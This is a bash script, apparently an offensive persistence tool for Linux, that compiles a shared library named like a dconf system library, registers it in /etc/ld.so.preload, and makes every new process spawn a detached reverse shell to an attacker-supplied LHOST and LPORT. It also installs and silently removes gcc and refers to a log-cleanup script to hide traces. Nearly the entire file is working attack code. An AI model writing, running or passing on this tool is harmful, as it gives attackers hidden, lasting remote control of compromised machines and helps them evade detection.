#!usr/bin/env bash

set -euo pipefail

LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"

SO_PATH="/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.$(date +%Y%m)"
LOCKFILE="/var/tmp/.dconf-lock"

RATE_LIMIT=300

info()  { echo "[*] $*"; }
success() { echo "[+] $*"; }
warn() { echo "[!] $*"; }
error()   { echo "[-] $*" >&2; }

# -- Preflight checks --
if [[ "$(id -u)" -ne 0 ]]; then
    error "This script must be run as root"
    exit 1
fi

if [[ -z "$LHOST" ]]; then
    error "LHOST is not set. Export it before running:"
    error " Export LHOST=<ip address>"
    exit 1
fi

# -- Find compiler --
CC=""
GCC_INSTALLED=0

for candidate in gcc cc; do
    if command -v "$candidate" &>/dev/null; then
        CC="$candidate"
        break
    fi
done

if [[ -z "$CC" ]]; then
    if ! command -v apt-get &>/dev/null; then
        error "No C compiler found and apt-get is not available"
        error "Install a compiler manually and re-run"
        exit 1
    fi

    info "No compiler found — installing gcc via apt-get..."

    # -qq suppresses most output
    # DEBIAN_FRONTEND=noninteractive prevents interactive prompts
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq gcc 2>/dev/null

    if ! command -v gcc &>/dev/null; then
        error "gcc installation failed"
        exit 1
    fi

    CC="gcc"
    GCC_INSTALLED=1
    success "gcc installed"
fi

if [[ ! -d /usr/lib/x86_64-linux-gnu ]]; then
    SO_PATH="/usr/lib/libdconf-1.so.0.$(date +%Y%m)"
fi

if grep -qF "$SO_PATH" /etc/ld.so.preload 2>/dev/null; then
    warn "ld.so.preload entry already present — skipping"
    exit 0
fi

C_SRC=$(mktemp /tmp/.dconf-XXXXXX.c)

info "Writing C source to ${C_SRC}..."

cat > "$C_SRC" <<CSRC
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <time.h>

static int _should_fire(void) {
    const char *lf = "${LOCKFILE}";
    struct stat st;
    if (stat(lf, &st) == 0) {
        time_t now;
        time(&now);
        if ((now - st.st_mtime) < ${RATE_LIMIT}) return 0;
    }
    FILE *f = fopen(lf, "w");
    if (f) fclose(f);
    return 1;
}

__attribute__((constructor))
static void _init(void) {
    if (!_should_fire()) return;
    if (fork() != 0) return;
    setsid();
    if (fork() != 0) _exit(0);
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "exec bash -i &>/dev/tcp/%s/%s <&1",
        "${LHOST}", "${LPORT}");
    char *args[] = {"/bin/bash", "-c", cmd, NULL};
    execv("/bin/bash", args);
    _exit(0);
}
CSRC

info "Compiling shared library with ${CC}..."

"$CC" -shared -fPIC -nostartfiles -o "$SO_PATH" "$C_SRC" -s 2>/dev/null

rm -f "$C_SRC"

if [[ ! -f "$SO_PATH" ]]; then
    error "Compilation failed — .so file not created"
    exit 1
fi

success "Shared library compiled: ${SO_PATH}"

if [[ "GCC_INSTALLED" -eq 1 ]]; then
    info "Removing gcc..."
    DEBIAN_FRONTEND=noninteractive apt-get remove -y -qq gcc 2>/dev/null
    DEBIAN_FRONTEND=noninteractive apt-get autoremove -y -qq 2>/dev/null
    success "gcc removed"
    info "Note: apt/dpkg logs contain install/remove records for gcc"
    info "Run cleanup_logs.sh to remove logs"
fi

info "Adding to /etc/ld.so.preload..."

touch /etc/ld.so.preload
echo "$SO_PATH" >> /etc/ld.so.preload

success "ld.so.preload entry added"
info "Fires in every new process — rate limited to once per ${RATE_LIMIT} seconds"
info ""
info "To remove:"
info "  1. sed -i '\|${SO_PATH}|d' /etc/ld.so.preload"
info "  2. rm ${SO_PATH}"
info "  3. rm -f ${LOCKFILE}"